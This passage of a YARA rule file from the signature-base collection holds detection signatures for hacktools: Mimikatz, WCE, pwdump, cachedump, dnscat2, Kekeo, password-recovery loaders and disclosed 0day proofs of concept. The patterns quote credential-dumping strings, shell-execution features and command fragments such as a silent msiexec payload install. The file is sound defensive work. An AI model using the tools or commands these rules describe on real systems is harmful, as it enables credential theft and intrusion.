      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "2016-03-09"
      score = 70
      id = "e8c4a672-229b-56c8-811b-071ae9ff341e"
   strings:
      $s1 = "PowershellMafia\\Invoke-Shellcode.ps1" ascii
      $s2 = "Nishang\\Do-Exfiltration.ps1" ascii
      $s3 = "PowershellMafia\\Invoke-Mimikatz.ps1" ascii
      $s4 = "Inveigh\\Inveigh.ps1" ascii
   condition:
      1 of them
}

rule PSAttack_ZIP {
   meta:
      description = "PSAttack - Powershell attack tool - file PSAttack.zip"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/gdssecurity/PSAttack/releases/"
      date = "2016-03-09"
      score = 100
      hash = "3864f0d44f90404be0c571ceb6f95bbea6c527bbfb2ec4a2b4f7d92e982e15a2"
      id = "4e064eb4-0b87-590c-9ee4-6764b982c006"
   strings:
      $s0 = "PSAttack.exe" fullword ascii
   condition:
      uint16(0) == 0x4b50 and all of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2016-04-01
   Identifier: Linux Hacktool Shark
*/

/* Super Rules ------------------------------------------------------------- */

rule Linux_Portscan_Shark_1 {
   meta:
      description = "Detects Linux Port Scanner Shark"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35"
      date = "2016-04-01"
      super_rule = 1
      hash1 = "4da0e535c36c0c52eaa66a5df6e070c52e7ddba13816efc3da5691ea2ec06c18"
      hash2 = "e395ca5f932419a4e6c598cae46f17b56eb7541929cdfb67ef347d9ec814dea3"
      id = "0b264106-3536-56f4-9e8c-68f3756af07d"
   strings:
      $s0 = "rm -rf scan.log session.txt" fullword ascii
      $s17 = "*** buffer overflow detected ***: %s terminated" fullword ascii
      $s18 = "*** stack smashing detected ***: %s terminated" fullword ascii
   condition:
      ( uint16(0) == 0x7362 and all of them )
}

rule Linux_Portscan_Shark_2 {
   meta:
      description = "Detects Linux Port Scanner Shark"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35"
      date = "2016-04-01"
      super_rule = 1
      hash1 = "5f80bd2db608a47e26290f3385eeb5bfc939d63ba643f06c4156704614def986"
      hash2 = "90af44cbb1c8a637feda1889d301d82fff7a93b0c1a09534909458a64d8d8558"
      id = "eea378d5-0399-5035-8573-139878fa1abc"
   strings:
      $s1 = "usage: %s <fisier ipuri> <fisier useri:parole> <connect timeout> <fail2ban wait> <threads> <outfile> <port>" fullword ascii
      $s2 = "Difference between server modulus and host modulus is only %d. It's illegal and may not work" fullword ascii
      $s3 = "rm -rf scan.log" fullword ascii
   condition:
      all of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2016-05-15
   Identifier: dnscat2
*/

rule dnscat2_Hacktool {
   meta:
      description = "Detects dnscat2 - from files dnscat, dnscat2.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://downloads.skullsecurity.org/dnscat2/"
      date = "2016-05-15"
      super_rule = 1
      hash1 = "8bc8d6c735937c9c040cbbdcfc15f17720a7ecef202a19a7bf43e9e1c66fe66a"
      hash2 = "4a882f013419695c8c0ac41d8a0fde1cf48172a89e342c504138bc6f1d13c7c8"
      id = "23cca0fe-3e4e-5b91-8b53-933de8ff264a"
   strings:
      $s1 = "--exec -e <process>     Execute the given process and link it to the stream." fullword ascii
      $s2 = "Sawlog" fullword ascii
      $s3 = "COMMAND_EXEC [request] :: request_id: 0x%04x :: name: %s :: command: %s" fullword ascii
      $s4 = "COMMAND_SHELL [request] :: request_id: 0x%04x :: name: %s" fullword ascii
      $s5 = "[Tunnel %d] connection to %s:%d closed by the server!" fullword ascii
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 400KB and ( 2 of ($s*) ) ) or ( all of them )
}

rule WCE_in_memory {
   meta:
      description = "Detects Windows Credential Editor (WCE) in memory (and also on disk)"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      score = 80
      date = "2016-08-28"
      id = "90c90ca5-e3be-5035-b35c-c2e7faec43a5"
   strings:
      $s1 = "wkKUSvflehHr::o:t:s:c:i:d:a:g:" fullword ascii
      $s2 = "wceaux.dll" fullword ascii
   condition:
      all of them
}

rule pstgdump {
   meta:
      description = "Detects a tool used by APT groups - file pstgdump.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08"
      hash1 = "65d48a2f868ff5757c10ed796e03621961954c523c71eac1c5e044862893a106"
      id = "86a105a3-b5b5-58b2-99bd-ec05f31adb6b"
   strings:
      $x1 = "\\Release\\pstgdump.pdb" ascii
      $x2 = "Failed to dump all protected storage items - see previous messages for details" fullword ascii
      $x3 = "ptsgdump [-h][-q][-u Username][-p Password]" fullword ascii
      $x4 = "Attempting to impersonate domain user '%s' in domain '%s'" fullword ascii
      $x5 = "Failed to impersonate user (ImpersonateLoggedOnUser failed): error %d" fullword ascii
      $x6 = "Unable to obtain handle to PStoreCreateInstance in pstorec.dll" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of ($x*) ) or ( 3 of them )
}

rule lsremora {
   meta:
      description = "Detects a tool used by APT groups"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08"
      hash1 = "efa66f6391ec471ca52cd053159c8a8778f11f921da14e6daf76387f8c9afcd5"
      hash2 = "e0327c1218fd3723e20acc780e20135f41abca35c35e0f97f7eccac265f4f44e"
      id = "c15c583f-70cd-5a80-bdea-a14582097e50"
   strings:
      $x1 = "Target: Failed to load primary SAM functions." fullword ascii
      $x2 = "lsremora64.dll" fullword ascii
      $x3 = "PwDumpError:999999" fullword wide
      $x4 = "PwDumpError" fullword wide
      $x5 = "lsremora.dll" fullword ascii

      $s1 = ":\\\\.\\pipe\\%s" fullword ascii
      $s2 = "x%s_history_%d:%d" fullword wide
      $s3 = "Using pipe %s" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of ($x*) ) or ( 3 of them )
}

rule servpw {
   meta:
      description = "Detects a tool used by APT groups - file servpw.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08"
      hash1 = "97b39ac28794a7610ed83ad65e28c605397ea7be878109c35228c126d43e2f46"
      hash2 = "0f340b471ef34c69f5413540acd3095c829ffc4df38764e703345eb5e5020301"
      id = "48b9dae1-16b3-563c-ac4e-b71f3a86b38a"
   strings:
      $s1 = "Unable to open target process: %d, pid %d" fullword ascii
      $s2 = "LSASS.EXE" fullword wide
      $s3 = "WriteProcessMemory failed: %d" fullword ascii
      $s4 = "lsremora64.dll" fullword ascii
      $s5 = "CreateRemoteThread failed: %d" fullword ascii
      $s6 = "Thread code: %d, path: %s" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 3 of them ) or ( all of them )
}

rule fgexec {
   meta:
      description = "Detects a tool used by APT groups - file fgexec.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08"
      hash1 = "8697897bee415f213ce7bc24f22c14002d660b8aaffab807490ddbf4f3f20249"
      id = "8ffe47b9-81a8-5eb4-b46f-db9d23682de4"
   strings:
      $x1 = "\\Release\\fgexec.pdb" ascii
      $x2 = "fgexec Remote Process Execution Tool" fullword ascii
      $x3 = "fgexec CallNamedPipe failed" fullword ascii
      $x4 = "fizzgig and the mighty foofus.net team" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of ($x*) ) or ( 3 of them )
}

rule cachedump {
   meta:
      description = "Detects a tool used by APT groups - from files cachedump.exe, cachedump64.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08"
      super_rule = 1
      hash1 = "cf58ca5bf8c4f87bb67e6a4e1fb9e8bada50157dacbd08a92a4a779e40d569c4"
      hash2 = "e38edac8c838a043d0d9d28c71a96fe8f7b7f61c5edf69f1ce0c13e141be281f"
      id = "ebcaeb73-d2df-5a4c-9f50-b4a01293b88b"
   strings:
      $s1 = "Failed to open key SECURITY\\Cache in RegOpenKeyEx. Is service running as SYSTEM ? Do you ever log on domain ? " fullword ascii
      $s2 = "Unable to open LSASS.EXE process" fullword ascii
      $s3 = "Service not found. Installing CacheDump Service (%s)" fullword ascii
      $s4 = "CacheDump service successfully installed." fullword ascii
      $s5 = "Kill CacheDump service (shouldn't be used)" fullword ascii
      $s6 = "cacheDump [-v | -vv | -K]" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 500KB and 1 of them ) or ( 3 of them )
}

rule PwDump_B {
   meta:
      description = "Detects a tool used by APT groups - file PwDump.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08"
      hash1 = "3c796092f42a948018c3954f837b4047899105845019fce75a6e82bc99317982"
      id = "aad974f1-76bf-5aae-8376-a4fd3f27b345"
   strings:
      $x1 = "Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineName" fullword ascii
      $x2 = "pwdump6 Version %s by fizzgig and the mighty group at foofus.net" fullword ascii
      $x3 = "where -x targets a 64-bit host" fullword ascii
      $x4 = "Couldn't delete target executable from remote machine: %d" fullword ascii

      $s1 = "lsremora64.dll" fullword ascii
      $s2 = "lsremora.dll" fullword ascii
      $s3 = "servpw.exe" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and 1 of ($x*) ) or ( 3 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2016-10-07
   Identifier: MSBuild Katz-XML
*/

/* Rule Set ----------------------------------------------------------------- */

rule MSBuild_Mimikatz_Execution_via_XML {
   meta:
      description = "Detects an XML that executes Mimikatz on an endpoint via MSBuild"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://gist.github.com/subTee/c98f7d005683e616560bda3286b6a0d8#file-katz-xml"
      date = "2016-10-07"
      id = "98aa68b9-6de4-5353-8d87-9e974529c044"
   strings:
      $x1 = "<Project ToolsVersion=" ascii
      $x2 = "</SharpLauncher>" fullword ascii

      $s1 = "\"TVqQAAMAAAA" ascii
      $s2 = "System.Convert.FromBase64String(" ascii
      $s3 = ".Invoke(" ascii
      $s4 = "Assembly.Load(" ascii
      $s5 = ".CreateInstance(" ascii
   condition:
      all of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-01-06
   Identifier: Fscan
*/

/* Rule Set ----------------------------------------------------------------- */

rule Fscan_Portscanner {
   meta:
      description = "Fscan port scanner scan output / strings"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://twitter.com/JamesHabben/status/817112447970480128"
      date = "2017-01-06"
      id = "400383dc-8bc0-5e77-a3f3-d6ba9f4c3c0f"
   strings:
      $s1 = "Time taken:" fullword ascii
      $s2 = "Scan finished at" fullword ascii
      $s3 = "Scan started at" fullword ascii
   condition:
      filesize < 20KB and 3 of them
}


/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-03-15
   Identifier: Windows Password Recovery
*/

/* Rule Set ----------------------------------------------------------------- */

rule WPR_loader_EXE {
   meta:
      description = "Windows Password Recovery - file loader.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "e7d158d27d9c14a4f15a52ee5bf8aa411b35ad510b1b93f5e163ae7819c621e2"
      id = "97fa3efb-9e7a-52ef-9e26-3fdd573d4d30"
   strings:
      $s1 = "Failed to get system process ID" fullword wide
      $s2 = "gLSASS.EXE" fullword wide
      $s3 = "WriteProcessMemory failed" fullword wide
      $s4 = "wow64 process NOT created" fullword wide
      $s5 = "\\ast.exe" wide
      $s6 = "Exit code=%s, status=%d" fullword wide
      $s7 = "VirtualProtect failed" fullword wide
      $s8 = "nSeDebugPrivilege" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 3 of them )
}

rule WPR_loader_DLL {
   meta:
      description = "Windows Password Recovery - file loader64.dll"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "7b074cb99d45fc258e0324759ee970467e0f325e5d72c0b046c4142edc6776f6"
      hash2 = "a1f27f7fd0e03601a11b66d17cfacb202eacf34f94de3c4e9d9d39ea8d1a2612"
      id = "d3102ab6-0473-544b-b9dd-ec7a18ae1c4b"
   strings:
      $x1 = "loader64.dll" fullword ascii
      $x2 = "loader.dll" fullword ascii

      $s1 = "TUlDUk9TT0ZUX0FVVEhFTlRJQ0FUSU9OX1BBQ0tBR0VfVjFfMA==" fullword ascii /* base64 encoded string 'MICROSOFT_AUTHENTICATION_PACKAGE_V1_0' */
      $s2 = "UmVtb3RlRGVza3RvcEhlbHBBc3Npc3RhbnRBY2NvdW50" fullword ascii /* base64 encoded string 'RemoteDesktopHelpAssistantAccount' */
      $s3 = "U2FtSVJldHJpZXZlUHJpbWFyeUNyZWRlbnRpYWxz" fullword ascii /* base64 encoded string 'SamIRetrievePrimaryCredentials' */
      $s4 = "VFM6SW50ZXJuZXRDb25uZWN0b3JQc3dk" fullword ascii /* base64 encoded string 'TS:InternetConnectorPswd' */
      $s5 = "TCRVRUFjdG9yQWx0Q3JlZFByaXZhdGVLZXk=" fullword ascii /* base64 encoded string 'L$UEActorAltCredPrivateKey' */
      $s6 = "YXNwbmV0X1dQX1BBU1NXT1JE" fullword ascii /* base64 encoded string 'aspnet_WP_PASSWORD' */
      $s7 = "TCRBTk1fQ1JFREVOVElBTFM=" fullword ascii /* base64 encoded string 'L$ANM_CREDENTIALS' */
      $s8 = "RGVmYXVsdFBhc3N3b3Jk" fullword ascii /* base64 encoded string 'DefaultPassword' */

      $op0 = { 48 8b cd e8 e0 e8 ff ff 48 89 07 48 85 c0 74 72 } /* Opcode */
      $op1 = { e8 ba 23 00 00 33 c9 ff 15 3e 82 } /* Opcode */
      $op2 = { 48 83 c4 28 e9 bc 55 ff ff 48 8d 0d 4d a7 00 00 } /* Opcode */
   condition:
      uint16(0) == 0x5a4d and
      filesize < 400KB and
      (
         ( 1 of ($x*) and 1 of ($s*) ) or
         ( 1 of ($s*) and all of ($op*) )
      )
}

rule WPR_Passscape_Loader {
   meta:
      description = "Windows Password Recovery - file ast.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "f6f2d4b9f19f9311ec419f05224a1c17cf2449f2027cb7738294479eea56e9cb"
      id = "d8e224ce-edd2-5e2d-9b6e-a8995f5d2c1c"
   strings:
      $s1 = "SYSTEM\\CurrentControlSet\\Services\\PasscapeLoader64" fullword wide
      $s2 = "ast64.dll" fullword ascii
      $s3 = "\\loader64.exe" wide
      $s4 = "Passcape 64-bit Loader Service" fullword wide
      $s5 = "PasscapeLoader64" fullword wide
      $s6 = "ast64 {msg1GkjN7Sh8sg2Al7ker63f}" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )
}

rule WPR_Asterisk_Hook_Library {
   meta:
      description = "Windows Password Recovery - file ast64.dll"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "225071140e170a46da0e57ce51f0838f4be00c8f14e9922c6123bee4dffde743"
      hash2 = "95ec84dc709af990073495082d30309c42d175c40bd65cad267e6f103852a02d"
      id = "03c20c9d-bb8f-53f6-9cb5-9b059fb24949"
   strings:
      $s1 = "ast64.dll" fullword ascii
      $s2 = "ast.dll" fullword wide
      $s3 = "c:\\%s.lvc" fullword ascii
      $s4 = "c:\\%d.lvc" fullword ascii
      $s5 = "Asterisk Hook Library" fullword wide
      $s6 = "?Ast_StartRd64@@YAXXZ" fullword ascii
      $s7 = "Global\\{1374821A-281B-9AF4-%04X-12345678901234}" fullword ascii
      $s8 = "2004-2013 Passcape Software" fullword wide
      $s9 = "Global\\Passcape#6712%04X" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 3 of them )
}

rule WPR_WindowsPasswordRecovery_EXE {
   meta:
      description = "Windows Password Recovery - file wpr.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "c1c64cba5c8e14a1ab8e9dd28828d036581584e66ed111455d6b4737fb807783"
      id = "7fa2062c-75dd-55aa-8775-631a9c1a497e"
   strings:
      $x1 = "UuPipe" fullword ascii
      $x2 = "dbadllgl" fullword ascii
      $x3 = "UkVHSVNUUlkgTU9O" fullword ascii /* base64 encoded string 'REGISTRY MON' */
      $x4 = "RklMRSBNT05JVE9SIC0gU1l" fullword ascii /* base64 encoded string 'FILE MONITOR - SY' */

      $s1 = "WPR.exe" fullword wide
      $s2 = "Windows Password Recovery" fullword wide

      $op0 = { 5f df 27 17 89 } /* Opcode */
      $op1 = { 5f 00 00 f2 e5 cb 97 } /* Opcode */
      $op2 = { e8 ed 00 f0 cc e4 00 a0 17 } /* Opcode */
   condition:
      uint16(0) == 0x5a4d and
      filesize < 20000KB and
      (
         1 of ($x*) or
         all of ($s*) or
         all of ($op*)
      )
}

rule WPR_WindowsPasswordRecovery_EXE_64 {
   meta:
      description = "Windows Password Recovery - file ast64.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "4e1ea81443b34248c092b35708b9a19e43a1ecbdefe4b5180d347a6c8638d055"
      id = "0f6c7695-e616-5757-b9cd-8cff5f972c3e"
   strings:
      $s1 = "%B %d %Y  -  %H:%M:%S" fullword wide

      $op0 = { 48 8d 8c 24 50 22 00 00 e8 bf eb ff ff 4c 8b c7 } /* Opcode */
      $op1 = { ff 15 16 25 01 00 f7 d8 1b } /* Opcode */
      $op2 = { e8 c2 26 00 00 83 20 00 83 c8 ff 48 8b 5c 24 30 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}


/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-03-17
   Identifier: BeyondExec Remote Access Tool
*/

/* Rule Set ----------------------------------------------------------------- */

rule BeyondExec_RemoteAccess_Tool {
   meta:
      description = "Detects BeyondExec Remote Access Tool - file rexesvr.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://goo.gl/BvYurS"
      date = "2017-03-17"
      hash1 = "3d3e3f0708479d951ab72fa04ac63acc7e5a75a5723eb690b34301580747032c"
      id = "fd68cb45-a46f-53d7-bf52-8f7bd3636d0d"
   strings:
      $x1 = "\\BeyondExecV2\\Server\\Release\\Pipes.pdb" ascii
      $x2 = "\\\\.\\pipe\\beyondexec%d-stdin" fullword ascii
      $x3 = "Failed to create dispatch pipe. Do you have another instance running?" fullword ascii

      $op1 = { 83 e9 04 72 0c 83 e0 03 03 c8 ff 24 85 80 6f 40 } /* Opcode */
      $op2 = { 6a 40 33 c0 59 bf e0 d8 40 00 f3 ab 8d 0c 52 c1 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and ( 1 of ($x*) or all of ($op*) ) ) or ( 3 of them )
}

rule Mimikatz_Gen_Strings {
   meta:
      description = "Detects Mimikatz by using some special strings"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-06-19"
      super_rule = 1
      hash1 = "058cc8b3e4e4055f3be460332a62eb4cbef41e3a7832aceb8119fd99fea771c4"
      hash2 = "eefd4c038afa0e80cf6521c69644e286df08c0883f94245902383f50feac0f85"
      hash3 = "f35b589c1cc1c98c4c4a5123fd217bdf0d987c00d2561992cbfb94bd75920159"
      id = "3f4ab5d7-5a9f-55f0-9dda-e2975df582a0"
   strings:
      $s1 = "[*] '%s' service already started" fullword wide
      $s2 = "** Security Callback! **" fullword wide
      $s3 = "Try to export a software CA to a crypto (virtual)hardware" fullword wide
      $s4 = "enterpriseadmin" fullword wide
      $s5 = "Ask debug privilege" fullword wide
      $s6 = "Injected =)" fullword wide
      $s7 = "** SAM ACCOUNT **" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and 1 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-07-07
   Identifier: 0day
   Reference: Disclosed 0day Repos
*/

/* Rule Set ----------------------------------------------------------------- */

rule Disclosed_0day_POCs_lpe {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07"
      hash1 = "e10ee278f4c86d6ee1bd93a7ed71d4d59c0279381b00eb6153aedfb3a679c0b5"
      hash2 = "a5916cefa0f50622a30c800e7f21df481d7a3e1e12083fef734296a22714d088"
      hash3 = "5b701a5b5bbef7027711071cef2755e57984bfdff569fe99efec14a552d8ee43"
      id = "d3693d1d-6085-5e62-8f0b-dde5b14758b7"
   strings:
      $x1 = "msiexec /f c:\\users\\%username%\\downloads\\" ascii
      $x2 = "c:\\users\\%username%\\downloads\\bat.bat" fullword ascii
      $x3 = "\\payload.msi /quiet" ascii
      $x4 = "\\payload2\\WindowsTrustedRTProxy.sys" wide
      $x5 = "\\payload2" wide
      $x6 = "\\payload" wide
      $x7 = "WindowsTrustedRTProxy.sys /grant:r administrators:RX" ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 70KB and 1 of them )
}

rule Disclosed_0day_POCs_exploit {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07"
      hash1 = "632d35a0bac27c9b2f3f485d43ebba818089cf72b3b8c4d2e87ce735b2e67d7e"
      id = "72b8aafd-d79a-5812-90fd-5d5aca109254"
   strings:
      $x1 = "\\Release\\exploit.pdb" ascii
      $x2 = "\\favorites\\stolendata.txt" wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule Disclosed_0day_POCs_InjectDll {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07"
      modified = "2022-12-21"
      hash1 = "173d3f78c9269f44d069afbd04a692f5ae42d5fdc9f44f074599ec91e8a29aa2"
      id = "90a4dca0-4f12-5946-9d5d-0b93bb5a3c5d"
   strings:
      $x1 = "\\Release\\InjectDll.pdb" ascii
      $x2 = "Specify -l to list all IE processes running in the current session" fullword ascii
      $x3 = "Usage: InjectDll -l|pid PathToDll" fullword ascii
      $x4 = "Injecting DLL: %ls into PID: %d" fullword ascii
      $x5 = "Error adjusting privilege %d" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them )
}

rule Disclosed_0day_POCs_payload_MSI {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07"
      modified = "2022-12-21"
      hash1 = "a7c498a95850e186b7749a96004a98598f45faac2de9b93354ac93e627508a87"
      id = "fe32af56-d5a1-5246-a7df-395b9cd02faf"
   strings:
      $s1 = "WShell32.dll" fullword wide
      $s2 = "Target empty, so account name translation begins on the local system." fullword wide
      $s3 = "\\custact\\x86\\AICustAct.pdb" ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 1000KB and all of them )
}

rule Disclosed_0day_POCs_injector {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07"
      hash1 = "ba0e2119b2a6bad612e86662b643a404426a07444d476472a71452b7e9f94041"
      id = "6de89a84-fe16-5064-8cbb-a3b9003f4c0c"
   strings:
      $x1 = "\\Release\\injector.pdb" ascii
      $x2 = "Cannot write the shellcode in the process memory, error: " fullword ascii
      $x3 = "/s shellcode_file PID: shellcode injection." fullword ascii
      $x4 = "/d dll_file PID: dll injection via LoadLibrary()." fullword ascii
      $x5 = "/s shellcode_file PID" fullword ascii
      $x6 = "Shellcode copied in memory: OK" fullword ascii
      $x7 = "Usage of the injector. " fullword ascii
      $x8 = "KO: cannot obtain the SeDebug privilege." fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 90KB and 1 of them ) or 3 of them
}

rule Disclosed_0day_POCs_lpe_2 {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07"
      hash1 = "b4f3787a19b71c47bc4357a5a77ffb456e2f71fd858079d93e694a6a79f66533"
      id = "9326bbae-81ee-588e-8581-628b47d348f8"
   strings:
      $s1 = "\\cmd.exe\" /k wusa c:\\users\\" ascii
      $s2 = "D:\\gitpoc\\UAC\\src\\x64\\Release\\lpe.pdb" fullword ascii
      $s3 = "Folder Created: " fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 700KB and 2 of them )
}

rule Disclosed_0day_POCs_shellcodegenerator {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07"
      hash1 = "55c4073bf8d38df7d392aebf9aed2304109d92229971ffac6e1c448986a87916"
      id = "49250cbe-7bbd-5462-9324-1a8f350386f3"
   strings:
      $x1 = "\\Release\\shellcodegenerator.pdb" ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 40KB and all of them )
}

rule SecurityXploded_Producer_String {
   meta:
      description = "Detects hacktools by SecurityXploded"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://securityxploded.com/browser-password-dump.php"
      date = "2017-07-13"
      score = 60
      hash1 = "d57847db5458acabc87daee6f30173348ac5956eb25e6b845636e25f5a56ac59"
      id = "739c4ba1-5126-51cc-a2dd-cdac2737e29a"
   strings:
      $x1 = "http://securityxploded.com" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and all of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-07-21
   Identifier: Kekeo
   Reference: https://github.com/gentilkiwi/kekeo/releases
*/

/* Rule Set ----------------------------------------------------------------- */

rule Kekeo_Hacktool {
   meta:
      description = "Detects Kekeo Hacktool"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/gentilkiwi/kekeo/releases"
      date = "2017-07-21"
      hash1 = "ce92c0bcdf63347d84824a02b7a448cf49dd9f44db2d02722d01c72556a2b767"
      hash2 = "49d7fec5feff20b3b57b26faccd50bc05c71f1dddf5800eb4abaca14b83bba8c"
      id = "a4158da8-fc4d-5dc6-b44c-f5325b3bb8ca"
   strings:
      $x1 = "[ticket %u] session Key is NULL, maybe a TGT without enough rights when WCE dumped it." fullword wide
      $x2 = "ERROR kuhl_m_smb_time ; Invalid! Command: %02x - Status: %08x" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 1 of ($x*) ) )
}


/*
   Yara Rule Set
   Author: Florian Roth
